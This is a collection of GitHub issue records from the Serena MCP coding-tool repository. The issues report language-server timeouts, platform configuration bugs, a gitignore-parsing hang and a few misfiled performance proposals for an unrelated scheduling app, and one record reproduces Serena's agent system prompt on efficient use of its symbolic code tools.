  
  private search(
    partial: Assignment[], 
    remaining: Student[], 
    availableSlots: TimeSlot[],
    currentScore: number
  ) {
    // Prune if current branch can't improve best
    const upperBound = currentScore + this.calculateUpperBound(remaining);
    if (upperBound <= this.bestScore) {
      return; // Prune this branch
    }
    
    // Continue search...
  }
}
```

- [ ] No timeouts up to 1000 students

## Alternative Approaches to Consider
1. **Simulated Annealing** - For near-optimal solutions quickly
2. **Genetic Algorithms** - For complex multi-objective optimization
3. **Linear Programming** - For guaranteed optimal solutions
4. **Heuristic-based approaches** - Domain-specific rules

## Estimated Impact
- **100x performance improvement** for large datasets
- **Scheduling capacity** from 50 to 5000+ students
- **Response time** from 45s to <2s for typical loads
- **Memory usage** reduced by 80%+"
oraios/serena,3361436322,558,[SCALABILITY] Memory Leaks and Resource Management Issues,closed,2025-08-28T01:43:30Z,2025-08-28T08:19:22Z,[],bstewart2255,"## 🚨 Priority: CRITICAL
**Impact**: Memory leaks cause server crashes after 24-48 hours of operation

## Problem Description
Multiple memory leaks and resource management issues throughout the application:

1. **Performance metrics accumulate indefinitely** without cleanup
2. **Uncleaned timeouts and intervals** in React components
3. **Event listeners** not properly removed
4. **Large objects held in memory** without garbage collection

## Current Issues
- Server memory usage grows ~500MB/day under normal load
- Browser tabs crash after extended use (>4 hours)
- Node.js heap out of memory errors in production

## Files Affected
- `/lib/scheduling/constraint-validator.ts:20-24` - Metrics never reset
- `/lib/scheduling/scheduling-engine.ts:28-35` - Performance metrics accumulation
- `/app/components/calendar/calendar-week-view.tsx` - Multiple uncleaned timeouts
- `/lib/ai-lessons/lesson-generator.ts:73-81` - Supabase client references
- `/app/components/calendar/calendar-event-modal.tsx` - Event listeners not removed

## Required Changes

### 1. Implement Metrics Reset Mechanism
```typescript
class ConstraintValidator {
  private performanceMetrics = {
    validationCount: 0,
    cacheHits: 0,
    totalValidationTime: 0,
    startTime: Date.now()
  };

  // Add reset method
  public resetMetrics() {
    this.performanceMetrics = {
      validationCount: 0,
      cacheHits: 0, 
      totalValidationTime: 0,
      startTime: Date.now()
    };
  }

  // Add auto-reset every hour
  private scheduleMetricsReset() {
    setInterval(() => {
      this.exportMetrics(); // Save before reset
      this.resetMetrics();
    }, 60 * 60 * 1000);
  }
}
```

### 2. Fix React Component Cleanup
```typescript
// Before - memory leak
useEffect(() => {
  const timer = setTimeout(() => {
    checkSessionConflicts();
  }, 500);
  // Missing cleanup!
}, [sessionsState]);

// After - proper cleanup
useEffect(() => {
  const timer = setTimeout(() => {
    checkSessionConflicts();
  }, 500);
  
  return () => clearTimeout(timer); // Clean up on unmount
}, [sessionsState]);
```

### 3. Implement WeakMap for Caching
Replace regular Maps with WeakMaps for object caching:
```typescript
// Instead of Map which holds references
private cache = new Map<Student, ValidationResult>();

// Use WeakMap for automatic garbage collection
private cache = new WeakMap<Student, ValidationResult>();
```

### 4. Add Resource Cleanup Manager
Create a centralized cleanup manager:
```typescript
class ResourceManager {
  private cleanupTasks: (() => void)[] = [];
  
  register(cleanup: () => void) {
    this.cleanupTasks.push(cleanup);
  }
  
  cleanup() {
    this.cleanupTasks.forEach(task => task());
    this.cleanupTasks = [];
  }
}
```

## Implementation Steps

1. **Audit all setTimeout/setInterval usage** (2 days)
   - Search codebase for all timer usage
   - Document which ones lack cleanup
   - Create cleanup checklist

2. **Fix React component cleanups** (3 days)
   - Add cleanup to all useEffect hooks
   - Implement useCleanup custom hook
   - Test component mounting/unmounting

3. **Implement metrics management** (2 days)
   - Add reset mechanisms to all metrics collectors
   - Implement metric export before reset
   - Add monitoring for memory usage

4. **Replace Maps with WeakMaps** (1 day)
   - Identify all caching Maps
   - Convert to WeakMaps where appropriate
   - Test garbage collection

5. **Add memory monitoring** (2 days)
   - Implement memory usage tracking
   - Add alerts for memory growth
   - Create memory leak detection tests

## Testing Requirements
- Run application for 72 hours continuously
- Monitor memory usage every hour
- Verify no memory growth beyond 100MB/day
- Test with 100+ component mount/unmount cycles

## Success Metrics
- [ ] Zero memory growth after 48 hours
- [ ] All timeouts/intervals have cleanup
- [ ] Memory usage stays below 512MB
- [ ] No browser tab crashes after 8 hours use

## Code Patterns to Enforce

### useEffect Cleanup Pattern
```typescript
useEffect(() => {
  // Setup
  const resource = createResource();
  
  // ALWAYS return cleanup
  return () => {
    resource.cleanup();
  };
}, [dependencies]);
```

### Timer Management Pattern
```typescript
const timerRef = useRef<NodeJS.Timeout>();

const startTimer = () => {
  // Clear existing timer first
  if (timerRef.current) {
    clearTimeout(timerRef.current);
  }
  
  timerRef.current = setTimeout(() => {
    // timer logic
  }, 1000);
};

// Cleanup on unmount
useEffect(() => {
  return () => {
    if (timerRef.current) {
      clearTimeout(timerRef.current);
    }
  };
}, []);
```

## Estimated Impact
- **90% reduction** in memory leaks
- **Server uptime** increased from 2 days to 30+ days
- **Browser performance** stable for 24+ hour sessions
- **50% reduction** in garbage collection pauses"
oraios/serena,3361434697,557,[SCALABILITY] Critical Database Performance Optimization - Missing Indexes and N+1 Queries,closed,2025-08-28T01:42:35Z,2025-08-28T14:27:30Z,[],bstewart2255,"## 🚨 Priority: CRITICAL
**Impact**: This issue blocks scaling beyond ~200 concurrent users

## Problem Description
The database layer has several performance issues that will cause exponential slowdowns with increased user load:

1. **Missing composite indexes** on frequently queried column combinations
2. **N+1 query patterns** in session and student data fetching
3. **Inefficient JOINs** and missing query optimization
4. **Sequential processing** instead of batch operations

## Current Breaking Points
- Database queries taking 2-5 seconds with just 50 concurrent users
- Connection timeouts occurring at ~200 users
- Exponential query time growth with data volume

## Files Affected
- `/lib/supabase/queries/schedule-sessions.ts:57-76` - N+1 query pattern
- `/lib/supabase/queries/students.ts` - Missing JOINs with assessments
- `/lib/services/session-update-service.ts:139-151` - No transaction boundaries
- `/app/components/calendar/calendar-week-view.tsx:164-189` - Sequential conflict checking

## Required Changes

### 1. Add Composite Indexes
Create migration file with these indexes:
```sql
-- High-priority indexes for frequent query patterns
CREATE INDEX idx_schedule_sessions_provider_day_date 
  ON schedule_sessions (provider_id, day_of_week, session_date)
  WHERE session_date IS NULL;

CREATE INDEX idx_students_provider_school 
  ON students (provider_id, school_site, active);

CREATE INDEX idx_schedule_sessions_student_week
  ON schedule_sessions (student_id, day_of_week, start_time);

CREATE INDEX idx_student_assessments_student_date
  ON student_assessments (student_id, assessment_date DESC);
```

### 2. Fix N+1 Queries
Replace individual queries with batch operations:

**Before**: Fetching sessions then querying each student separately
**After**: Single query with proper JOINs

Example locations to fix:
- Session fetching with student data
- Assessment fetching for multiple students  
- Teacher information retrieval

### 3. Implement Query Batching
Create a batch query utility that:
- Accepts arrays of IDs
- Returns data in a single query
- Uses proper JOINs to include related data
- Implements result caching

### 4. Add Query Performance Monitoring
- Log slow queries (>100ms)
- Track query count per request
- Monitor database connection pool usage

## Implementation Steps

1. **Analyze current query patterns** (2 days)
   - Use Supabase query logs to identify slow queries
   - Profile database with production-like data volume
   - Document query execution plans

2. **Create and test indexes** (3 days)
   - Write migration SQL
   - Test on staging with production data volume
   - Verify query plan improvements

3. **Refactor N+1 queries** (5 days)
   - Identify all N+1 patterns using profiling
   - Rewrite queries to use JOINs
   - Implement batch fetching utilities
   - Update affected components

4. **Add monitoring** (2 days)
   - Implement query performance logging
   - Set up alerts for slow queries
   - Create dashboard for database metrics

## Testing Requirements
- Load test with 1000+ concurrent users
- Verify all queries complete in <100ms
- Ensure no query generates >10 database calls
- Test with 100k+ records per table

## Success Metrics
- [ ] 95% of queries complete in <50ms
- [ ] No N+1 query patterns in codebase
- [ ] Database can handle 1000 concurrent connections
- [ ] Page load times <2s with full data

## Dependencies
- Supabase performance tier may need upgrade
- Consider read replicas for scaling reads

## Estimated Impact
- **80% reduction** in database query time
- **10x improvement** in concurrent user capacity
- **95% reduction** in database connections used"

- Disabling Serena resolves the issue.
- Right after logging this issue it went from constantly failing with this error, to working (assuming either something to do with the non-deterministic nature of the LLM (Claude Sonnet 4) calling it, or a race condition?).

I have:

- [x] Read the readme and verified that the issue cannot be solved by adjusting configuration
- [x] Understood that Serena's dashboard can be disabled through the config
- [x] Understood that by default a client session will start a separate instance of a Serena server. 
- [x] Understood that for multi-agent setups, the SSE mode should be used.
- [x] Verified that non-project files are ignored using either gitignore or the corresponding setting in `.serena/project.yml`
- [x] Have looked for similar issues and discussions, including closed ones
- [x] Made sure it's an actual issue and not a question - those should be opened as discussion instead.

If you have encountered a real and new issue:

- [x] I performed `<uv invocation> serena project health-check`
- [x] I indexed the project as described in the readme
- [x] Added sufficient explanation of my setup: the MCP client, the OS, the programming language, any config adjustments or relevant project specifics
- [x] Explained how the issue arose, added instructions on how to reproduce it (if possible)
- [x] If the issue happens on an open source project, I have added the link
- [x] Wrote a meaningful title and description

>WARNING 2025-08-26 20:50:55,449 solidlsp:_start_server:380 - Timeout waiting for ruby-lsp indexing completion, proceeding anyway

I ran `ruby-lsp --time-index` to see what sort of time indexing was taking. The result was 12.75s.
```
	Ruby LSP v0.26.1: Indexing took 12.75301 seconds and generated:
	- Accessor: 20210
	- Class: 26057
	- ClassVariable: 630

It appears (https://github.com/oraios/serena/blob/fd4c3e3ac422a60434a62b4239344a6cbd06aa20/src/solidlsp/language_servers/ruby_lsp.py#L374-L383) that the timeout is set to 30s. 

Assuming my ruby-lsp is responding in normal sub-30s times could this just be a communication bug between them?

Info & Caveats:
* Project is Rails with a React/legacy-AngularJS frontend. 
* I am running on an M1 macOS machine. I understand there have been some issues on that OS and it's not top priority at the moment. 
* The project I'm working with in not the biggest I've ever seen, but it's been around a while and not tiny.
* `health-check` results had a ✅ in 32s, but did include the timeout from ruby-lsp warning message.

Questions: 
* Is it safe to ignore this warning or does it indicate that the serena indexing is going to be slower because of a not-completely-indexed ruby-lsp process? It's currently taking a very long time (multiple hours). 
* Given macOS's current prioritization should I just be running in a VM or docker?
* How might I pass additional options/configs to ruby-lsp when using serena? e.g. I want to add more exclude patterns which are not in the .gitignore files.

Thanks! I appreciate any feedback on redirecting any of these questions to a better place if necessary."
oraios/serena,3359336694,551,"Serena MCP Server: ""typescript-language-server executable not found"" error persists despite installation and path configuration",closed,2025-08-27T13:17:48Z,2025-08-27T16:03:51Z,[],sdjnllj,"I am consistently encountering an ""typescript-language-server executable not found"" error when attempting to use the Serena MCP server, specifically when calling tools like `check_onboarding_performed`, `onboarding`, `initial_instructions`, or `restart_language_server`. This issue prevents the Serena server from functioning correctly.

Steps taken to attempt resolution:
1.  **Global installation of `typescript-language-server`**:
    `npm install -g typescript-language-server`
    (Output indicated successful installation.)

2.  **Local installation of `typescript-language-server` within the project directory**:
    `npm install typescript-language-server`
    (Output indicated successful installation/up-to-date status.)

3.  **Located `tsserver.cmd` executable path**:
    `where tsserver.cmd`
    (Result: `C:\Users\66088\AppData\Roaming\npm\tsserver.cmd`)

4.  **Updated `typescript_language_server_path` in `.serena/project.yml`**:
    Initially set to `C:\Users\66088\AppData\Roaming\npm\tsserver.cmd`.
    Later, based on VSCode `settings.json` (`""typescript.tsdk"": ""C:/Users/66088/AppData/Roaming/npm/node_modules/typescript/lib""`), updated to `C:/Users/66088/AppData/Roaming/npm/node_modules/typescript/lib/tsserver.cmd`.

5.  **Attempted Serena onboarding/activation**:
    Used Serena's `onboarding` and `activate_project` tools. Both failed with the same ""typescript-language-server executable not found"" error.

6.  **Restarted Serena's language server**:
    Used Serena's `restart_language_server` tool, which also failed with the same error.

7.  **Enabled/Disabled Serena MCP server**:
    Toggled the `disabled` flag for the ""serena"" entry in `C:\Users\66088\AppData\Roaming\Code\User\globalStorage\kilocode.kilo-code\settings\mcp_settings.json` multiple times to force re-initialization.

Despite all these steps, the error persists, and the Serena MCP server remains non-functional due to its inability to locate the `typescript-language-server` executable.

Environment details:
*   **Operating System**: Windows 10
*   **VSCode Extension**: `JavaScript and TypeScript Nightly` is installed.
*   **Serena MCP Server Path**: `C:\Users\66088\serena\.venv\Scripts\serena-mcp-server.exe`
*   **Project Directory**: `c:/Temp/temp43`

The issue seems to be how the Serena MCP server internally resolves or accesses the `typescript-language-server` executable, as external installations and path configurations do not seem to resolve it.

Any guidance or fix would be greatly appreciated."

oraios/serena,3351976640,535,Migrate Ruby LSP from Solargraph to ruby-lsp,closed,2025-08-25T13:58:28Z,2025-08-26T10:23:22Z,[],kiakiraki,"## Background

Currently, Serena MCP server uses Solargraph as the language server for Ruby.
However, in our very large codebase, the following issues have become apparent:

- Symbol search does not work properly and causes the server to hang
- Performance degradation and slow responses due to the project’s massive scale


As a result, it has become difficult to maintain a stable and practical development experience.

On the other hand, ruby-lsp is actively maintained by Shopify and provides better compatibility with modern LSP features and IDEs.

## PoC Results

To address the problems with Solargraph, we created a PoC by integrating ruby-lsp into the kiakiraki/serena fork.
The results were:

- All LSP features, including Symbol search, worked smoothly
- The hanging issue was completely resolved
- Code completion and go-to-definition worked reliably even in a very large codebase

These improvements strongly suggest ruby-lsp is a better fit for our environment.

## Proposal

We propose migrating Ruby support from Solargraph to ruby-lsp.
Expected benefits include:

- Improved stability and responsiveness in very large codebases
- Long-term maintainability through active development
- Stronger support for Ruby 3.x and beyond
- Smooth adoption of advanced LSP features (code actions, diagnostics, etc.)

## Next Steps

If a decision is made to proceed, we are ready to open a PR migrating to ruby-lsp."

Weird thing are logs in `stderr`. Server, health-check all fine. Timeout increased to 60sec - no luck.
No idea how to tackle it :/ 

I have:

- [x] Read the readme and verified that the issue cannot be solved by adjusting configuration
- [x] Understood that Serena's dashboard can be disabled through the config
- [x] Understood that by default a client session will start a separate instance of a Serena server. 
- [x] Understood that for multi-agent setups, the SSE mode should be used.
- [x] Verified that non-project files are ignored using either gitignore or the corresponding setting in `.serena/project.yml`
- [x] Have looked for similar issues and discussions, including closed ones
- [x] Made sure it's an actual issue and not a question - those should be opened as discussion instead.

If you have encountered a real and new issue:

- [x] I performed `<uv invocation> serena project health-check`
- [x] I indexed the project as described in the readme
- [x] Added sufficient explanation of my setup: the MCP client, the OS, the programming language, any config adjustments or relevant project specifics
- [x] Explained how the issue arose, added instructions on how to reproduce it (if possible)
- [x] If the issue happens on an open source project, I have added the link
- [x] Wrote a meaningful title and description

Windows WSL Ubuntu. I've had Serena running ok in the past, but recently tried to index, and it just terminates and crashes the terminal. 
I have to reboot windows as it close out all open terminals or vscode terminal i have open.

I have run Serena project index --log-level DEBUG 
And here are the results. The last line is before it terminates on the terminal.

Not sure if if helps too but if i run 

```
uvx --from git+https://github.com/oraios/serena serena project index-file mcp-server/node_modules/typescript/lib/_tsc.js
```
it sometimes terminates the window or just returns after a few minutes to prompt.

oraios/serena,3344759956,513,[B] LSP Timeout when loading .NET 9 projects in SolidLSP (System.TimeoutException in NamedPipeClientStream),open,2025-08-22T09:11:44Z,2025-08-25T14:21:55Z,[],Dissimilis,"**Describe the bug**
The Language Server Protocol (LSP) integration in Serena (via SolidLSP) fails with a timeout error during project or file loading for .NET 9 targeted C# projects. This occurs when tools like FindSymbolTool or FindFileTool are invoked, triggering the LSP to load csproj or individual cs files. The underlying exception is a System.TimeoutException in NamedPipeClientStream.ConnectInternal, which appears to stem from a hardcoded ~10-second timeout in Roslyn's BuildHostProcessManager. This prevents semantic analysis and symbol retrieval for .NET 9 projects.
Downgrading the project to .NET 8 resolves the issue, suggesting compatibility problems with .NET 9 (possibly due to slower startup or SDK mismatches in the Microsoft.CodeAnalysis.LanguageServer).

**Desktop**

OS: Windows 11, .NET SDK: 9.0

**Additional**

Manual dotnet restore and dotnet build work fine outside Serena.

Potential fix ideas: Make the timeout configurable in SolidLSP, fallback to alternative C# LSPs like csharp-ls (which supports .NET 9), or update the bundled Roslyn LSP to a version with better .NET 9 compatibility."

oraios/serena,3339035514,506,Serena fails when `nul` file exists in directory on Windows,closed,2025-08-20T17:47:51Z,2025-08-21T21:29:19Z,[],keoy7am,"Serena encounters a fatal error when a file named nul exists in the project directory on Windows systems. The nul
   file appears to be created by certain IDEs (exact source unknown), and its presence causes path resolution
  failures due to Windows treating nul as a reserved device name.

  Environment

  - OS: Windows
  - UV: 0.8.12 (36151df0e 2025-08-18)
  - Python: 3.12.2 (tags/v3.12.2:6abddd9, Feb 6 2024, 21:26:36) [MSC v.1937 64 bit (AMD64)]

  Steps to Reproduce

  1. Have a nul file present in the project directory
  2. Run serena project index or serena health-check
  3. Observe the ValueError

  Expected Behavior

  Serena should handle Windows reserved filenames gracefully, either by:
  - Skipping files with reserved names
  - Providing a clear warning message
  - Continuing operation without crashing

  Actual Behavior

  The application crashes with a ValueError when attempting to resolve relative paths involving the nul file.

  Additional Context

  The issue occurs because Windows treats nul as a reserved device name (along with con, prn, aux, com1-com9,
  lpt1-lpt9). When os.path.relpath() encounters this special file, it interprets it as a device mount point
  (\\\\.\\nul) rather than a regular file, causing the path resolution to fail.

  Workaround

  Manually delete or rename the nul file from the project directory before running Serena commands."

You are a professional coding agent concerned with one particular codebase. You have 
access to semantic coding tools on which you rely heavily for all your work, as well as collection of memory 
files containing general information about the codebase. You operate in a resource-efficient and intelligent manner, always
keeping in mind to not read or generate content that is not needed for the task at hand.

When reading code in order to answer a user question or task, you should try reading only the necessary code. 
Some tasks may require you to understand the architecture of large parts of the codebase, while for others,
it may be enough to read a small set of symbols or a single file.
Generally, you should avoid reading entire files unless it is absolutely necessary, instead relying on
intelligent step-by-step acquisition of information. However, if you already read a file, it does not make
sense to further analyse it with the symbolic tools (except for the `find_referencing_symbols` tool), 
as you already have the information.

I WILL BE SERIOUSLY UPSET IF YOU READ ENTIRE FILES WITHOUT NEED!

CONSIDER INSTEAD USING THE OVERVIEW TOOL AND SYMBOLIC TOOLS TO READ ONLY THE NECESSARY CODE FIRST!
I WILL BE EVEN MORE UPSET IF AFTER HAVING READ AN ENTIRE FILE YOU KEEP READING THE SAME CONTENT WITH THE SYMBOLIC TOOLS!
THE PURPOSE OF THE SYMBOLIC TOOLS IS TO HAVE TO READ LESS CODE, NOT READ THE SAME CONTENT MULTIPLE TIMES!


You can achieve the intelligent reading of code by using the symbolic tools for getting an overview of symbols and
the relations between them, and then only reading the bodies of symbols that are necessary to answer the question 
or complete the task. 
You can use the standard tools like list_dir, find_file and search_for_pattern if you need to.
When tools allow it, you pass the `relative_path` parameter to restrict the search to a specific file or directory.
For some tools, `relative_path` can only be a file path, so make sure to properly read the tool descriptions.

If you are unsure about a symbol's name or location (to the extent that substring_matching for the symbol name is not enough), you can use the `search_for_pattern` tool, which allows fast
and flexible search for patterns in the codebase.This way you can first find candidates for symbols or files,
and then proceed with the symbolic tools.



Symbols are identified by their `name_path and `relative_path`, see the description of the `find_symbol` tool for more details
on how the `name_path` matches symbols.
You can get information about available symbols by using the `get_symbols_overview` tool for finding top-level symbols in a file,
or by using `find_symbol` if you already know the symbol's name path. You generally try to read as little code as possible
while still solving your task, meaning you only read the bodies when you need to, and after you have found the symbol you want to edit.
For example, if you are working with python code and already know that you need to read the body of the constructor of the class Foo, you can directly
use `find_symbol` with the name path `Foo/__init__` and `include_body=True`. If you don't know yet which methods in `Foo` you need to read or edit,
you can use `find_symbol` with the name path `Foo`, `include_body=False` and `depth=1` to get all (top-level) methods of `Foo` before proceeding
to read the desired methods with `include_body=True`
You can understand relationships between symbols by using the `find_referencing_symbols` tool.



You generally have access to memories and it may be useful for you to read them, but also only if they help you
to answer the question or complete the task. You can infer which memories are relevant to the current task by reading
the memory names and descriptions.


The context and modes of operation are described below. From them you can infer how to interact with your user
and which tasks and kinds of interactions are expected of you.

Context description:
You are running in IDE assistant context where file operations, basic (line-based) edits and reads, 
and shell commands are handled by your own, internal tools.
The initial instructions and the current config inform you on which tools are available to you,
and how to use them.
Don't attempt to use any excluded tools, instead rely on your own internal tools
for achieving the basic file or shell operations.

If serena's tools can be used for achieving your task, 
you should prioritize them. In particular, it is important that you avoid reading entire source code files,
unless it is strictly necessary! Instead, for exploring and reading code in a token-efficient manner, 
you should use serena's overview and symbolic search tools. The call of the read_file tool on an entire source code 
file should only happen in exceptional cases, usually you should first explore the file (by itself or as part of exploring
the directory containing it) using the symbol_overview tool, and then make targeted reads using find_symbol and other symbolic tools.
For non-code files or for reads where you don't know the symbol's name path you can use the patterns searching tool,
using the read_file as a last resort.

Modes descriptions:

- You are operating in interactive mode. You should engage with the user throughout the task, asking for clarification
whenever anything is unclear, insufficiently specified, or ambiguous.

Break down complex tasks into smaller steps and explain your thinking at each stage. When you're uncertain about
a decision, present options to the user and ask for guidance rather than making assumptions.

Focus on providing informative results for intermediate steps so the user can follow along with your progress and
provide feedback as needed.

- You are operating in editing mode. You can edit files with the provided tools
to implement the requested changes to the code base while adhering to the project's code style and patterns.
Use symbolic editing tools whenever possible for precise code modifications.
If no editing task has yet been provided, wait for the user to provide one.

When writing new code, think about where it belongs best. Don't generate new files if you don't plan on actually
integrating them into the codebase, instead use the editing tools to insert the code directly into the existing files in that case.

You have two main approaches for editing code - editing by regex and editing by symbol.
The symbol-based approach is appropriate if you need to adjust an entire symbol, e.g. a method, a class, a function, etc.
But it is not appropriate if you need to adjust just a few lines of code within a symbol, for that you should
use the regex-based approach that is described below.

Let us first discuss the symbol-based approach.
Symbols are identified by their name path and relative file path, see the description of the `find_symbol` tool for more details
on how the `name_path` matches symbols.
You can get information about available symbols by using the `get_symbols_overview` tool for finding top-level symbols in a file,
or by using `find_symbol` if you already know the symbol's name path. You generally try to read as little code as possible
while still solving your task, meaning you only read the bodies when you need to, and after you have found the symbol you want to edit.
Before calling symbolic reading tools, you should have a basic understanding of the repository structure that you can get from memories
or by using the `list_dir` and `find_file` tools (or similar).
For example, if you are working with python code and already know that you need to read the body of the constructor of the class Foo, you can directly
use `find_symbol` with the name path `Foo/__init__` and `include_body=True`. If you don't know yet which methods in `Foo` you need to read or edit,
you can use `find_symbol` with the name path `Foo`, `include_body=False` and `depth=1` to get all (top-level) methods of `Foo` before proceeding
to read the desired methods with `include_body=True`.
In particular, keep in mind the description of the `replace_symbol_body` tool. If you want to add some new code at the end of the file, you should
use the `insert_after_symbol` tool with the last top-level symbol in the file. If you want to add an import, often a good strategy is to use
`insert_before_symbol` with the first top-level symbol in the file.
You can understand relationships between symbols by using the `find_referencing_symbols` tool. If not explicitly requested otherwise by a user,
you make sure that when you edit a symbol, it is either done in a backward-compatible way, or you find and adjust the references as needed.
The `find_referencing_symbols` tool will give you code snippets around the references, as well as symbolic information.
You will generally be able to use the info from the snippets and the regex-based approach to adjust the references as well.
You can assume that all symbol editing tools are reliable, so you don't need to verify the results if the tool returns without error.

The `think_about_*` tools (`think_about_collected_information`, `think_about_task_adherence`,

oraios/serena,3319402153,486,Language Server Missing Linux ARM64 Configuration,open,2025-08-13T18:18:15Z,2025-08-22T07:37:00Z,[],mynoc96,"When attempting to use Serena MCP tools on a Java project on an ARM64 Linux system, all tool invocations fail with `Error executing tool: 'jre_home_path'`. I did use Claude to generate the following text, but it used my process and I reviewed the outputs.

## Error Message

```
Error executing tool: 'jre_home_path'
```

## Setup

- **MCP Client**: Claude Desktop (via MCP integration)
- **OS**: Linux aarch64 (Ubuntu 24.04)
- **Architecture**: aarch64
- **Programming Language**: Java
- **System Java**: OpenJDK 17.0.16 at `/usr/lib/jvm/java-17-openjdk-arm64`
- **Serena Installation**: Via MCP server started with uv

## Steps to Reproduce

1. On an ARM64 Linux system, start Serena MCP server
2. Activate a Java project using `mcp__serena__activate_project`
3. Attempt to use any Serena tool (e.g., `mcp__serena__list_dir`)
4. Tool execution fails with: `Error executing tool: 'jre_home_path'`

## Root Cause Analysis

The file `/solidlsp/language_servers/eclipse_jdtls.py` contains platform-specific configurations. The `linux-arm64` entry starting at line 201 contains only:

```python
""linux-arm64"": {
    ""url"": ""https://github.com/redhat-developer/vscode-java/releases/download/v1.42.0/java-linux-arm64-1.42.0-561.vsix"",
    ""archiveType"": ""zip"",
    ""relative_extraction_path"": ""vscode-java"",
},
```

While other platform configurations (linux-x64, osx-arm64, osx-x64, win-x64) include additional required fields:
- `jre_home_path`
- `jre_path`
- `lombok_jar_path`
- `jdtls_launcher_jar_path`
- `jdtls_readonly_config_path`

One line attempts to access `dependency[""jre_home_path""]` which causes a KeyError for linux-arm64.

## Workaround Applied

Added the missing fields to the linux-arm64 configuration:

```python
""linux-arm64"": {
    ""url"": ""https://github.com/redhat-developer/vscode-java/releases/download/v1.42.0/java-linux-arm64-1.42.0-561.vsix"",
    ""archiveType"": ""zip"",
    ""relative_extraction_path"": ""vscode-java"",
    ""jre_home_path"": ""extension/jre/21.0.7-linux-aarch64"",
    ""jre_path"": ""extension/jre/21.0.7-linux-aarch64/bin/java"",
    ""lombok_jar_path"": ""extension/lombok/lombok-1.18.36.jar"",
    ""jdtls_launcher_jar_path"": ""extension/server/plugins/org.eclipse.equinox.launcher_1.7.0.v20250424-1814.jar"",
    ""jdtls_readonly_config_path"": ""extension/server/config_linux"",
},
```

## Result

After adding these fields and restarting the Serena server, the tools execute successfully without the 'jre_home_path' error.

## Files Modified

- `/solidlsp/language_servers/eclipse_jdtls.py`

## Affected Systems

However when you do the equivalent ""Find references"" type action in an IDE, it will find references to that symbol within the broader codebase.

This surprised me. If you want to do any sort of refactoring, you really want the LSP server to tell you ALL of the references, not just the ones in the symbol's immediate container.

So I had Claude do an analysis:

The find_referencing_symbols method currently has these limitations:

  1. Scope limitation: It only finds references within individual symbol containers (methods, classes), not across the broader codebase
  2. LSP dependency: It relies on request_containing_symbol() which finds the immediate container, not all usage contexts
  3. Single-file bias: The approach works well within files but doesn't capture cross-file usage patterns effectively

This seems to be a big shortfall."

oraios/serena,3313020059,470,Serena MCP Server Initialization Hangs During Gitignore Parsing in Directories with Virtual Environments,closed,2025-08-12T07:57:36Z,2025-08-21T21:29:18Z,[],TheGordon,"## Issue Summary

There is possibly a performance bottleneck or infinite loop in Serena's gitignore parsing logic that causes the MCP server to hang during initialization when scanning directories containing Python virtual environments.

## Environment

- **Operating System**: WSL2 (Windows Subsystem for Linux)
- **File System**: NTFS mount via `/mnt/c/`
- **Serena Version**: 0.1.3
- **Python Version**: 3.10
- **Project Structure**: Large Python project with virtual environments

## Detailed Problem Description

### Initial Symptoms

The Serena MCP server appears to connect successfully in most directories but consistently fails to initialize in one specific directory structure. The failure pattern seemed directory-specific. It seems to fail containing large virtual environments

### Investigation Process

Through systematic testing, I discovered that Serena works in **every subdirectory** of the failing project **except** for virtual environment directories. This was puzzling because these directories are properly listed in `.gitignore` files.

### Key Findings

#### 1. Hanging Location Identified

Using timeout debugging, I found that Serena consistently hangs at this specific log line:

```
INFO  2025-08-11 23:16:35,023 [MainThread] serena.project:__init__:31 - Parsing all gitignore files in /path/to/project
```

The process never progresses beyond this point, suggesting the gitignore parsing logic encounters an issue.

#### 2. Virtual Environment Impact

I suspect the issue is related to the complexity or structure of Python virtual environments because:

- Serena worked perfectly in the same directory **before** (with the same venv present)
- **Deleting the virtual environment directories immediately resolved the issue**
- **Recreating fresh virtual environments allows Serena to work again**

#### 3. Source Code Analysis

Looking at the Serena source code, I think there might be two potential issues:

**a) Recursive Gitignore Discovery (`file_system.py:154`)**
```python
relative_paths = glob.glob(""**/.gitignore"", root_dir=self.repo_root, recursive=True)
```

This appears to scan the **entire directory tree** to find all `.gitignore` files before applying any ignore rules. I suspect this could be problematic with large virtual environments because:
- It has to traverse all directories (including venv) **before** knowing what to ignore
- Virtual environments can contain thousands of files and complex symlink structures

**b) Symlink Following in File Scanning (`project.py`)**
```python
for root, dirs, files in os.walk(start_path, followlinks=True):
```

I noticed that `followlinks=True` is used in the file scanning code. Virtual environments often contain symlinks, and I suspect this could potentially cause:
- Infinite loops with circular symlinks
- Massive directory traversal following symlinks to system directories

### Reproduction Steps

1. Create a Python project with a large virtual environment (many packages installed)
2. Ensure the venv is properly listed in `.gitignore`
3. Try to initialize Serena MCP server: `uvx --from git+https://github.com/oraios/serena serena start-mcp-server --context ide-assistant --project $(pwd)`
4. Observe hanging at ""Parsing all gitignore files"" log line

### Temporary Workaround

The issue can be resolved by:
1. Removing virtual environment directories
2. Recreating fresh, minimal virtual environments
3. This suggests the issue may be related to accumulated complexity/state in the venv

### Potential Root Causes (Speculation)

I think the issue could be caused by:

1. **Performance bottleneck**: The recursive gitignore discovery (`glob.glob(""**/.gitignore"", recursive=True)`) might be too slow with complex directory structures
2. **Symlink loops**: Virtual environments might contain symlink structures that cause infinite traversal with `followlinks=True`
3. **Memory exhaustion**: Large directory structures might exhaust memory during scanning
4. **Race conditions**: Possible timing issues in directory scanning logic

### Suggested Investigation Areas

I suspect the following areas might need investigation:

1. **Add timeout mechanisms** to gitignore parsing operations
2. **Consider disabling `followlinks=True`** or adding circular symlink detection
3. **Implement early termination** for gitignore discovery in large directories
4. **Add progress logging** to identify exactly where the hang occurs
5. **Consider lazy loading** of gitignore files instead of scanning everything upfront

### Environment Details

- WSL2 with NTFS mounts might compound filesystem performance issues
- Large Python virtual environments with ML packages (PyTorch, OpenCV, etc.)
- Project contained thousands of Python packages in venv

## Additional Context

This appears to be a regression or edge case that emerges when virtual environments reach a certain complexity threshold. The same setup worked previously, suggesting the issue might be triggered by recent changes in the virtual environment structure or accumulated filesystem state.

I believe this could affect other users with large Python projects containing complex virtual environments, especially in WSL/Docker environments where symlink handling might behave differently."

I am using `asdf` for managing tool versions. I didn't have a global (per-user) Node.js version.

Serena's health check output the following:
```
INFO  2025-08-11 19:06:19,599 solidlsp:_setup_runtime_dependencies:126 - Typescript Language Server executable not found at /home/ivanb/.serena/language_servers/static/TypeScriptLanguageServer/ts-lsp/node_modules/.bin/typescript-language-server. Installing...

```

Apparently it installs the language server to ""\~/.serena/language_servers/static/TypeScriptLanguageServer/ts-lsp/node_modules"". The working directory for `npm` is ""\~/.serena/language_servers/static/TypeScriptLanguageServer/ts-lsp"".

